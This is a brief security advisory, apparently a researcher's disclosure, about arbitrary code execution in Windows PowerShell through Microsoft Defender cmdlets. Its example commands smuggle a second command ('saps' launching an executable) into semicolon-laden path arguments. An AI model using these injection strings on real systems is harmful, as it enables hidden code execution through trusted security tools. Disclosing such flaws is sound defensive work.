[Product]
Windows PowerShell


[Vulnerability Type]
Arbitrary Code Execution


[CVE Reference]
N/A


[Security Issue]
Microsoft Defender Anti Malware and or PS API's can result in executing
arbitrary code.
E.g. scan a directory, shortcut .lnk or even non-existent item, may execute
unintended code.
This vector builds upon my previous advisory and subsequent project
PSTrojanFile.

Requirements:
1) On CL 'powershell' cmd is prefixed or passed in by calling PowerShell
from another script
2) Executable file of same name as the parameter that lives nearby

Examples:
powershell Start-MpScan -Scanpath "C:\Users\gg\Downloads\;saps
Helper;.1.zip"
(Helper.exe lives on Desktop)

Create directory  ";saps Test", Test.exe, Test.cmd etc is on same CL path
powershell Add-MpPreference -ControlledFolderAccessAllowedApplications
";saps Test"

Create directory with semicolon, drop PE file named doom.exe in same path.
powershell Set-ProcessMitigation -PolicyFilePath  "test;saps doom"

TODO: Update PSTrojanFile
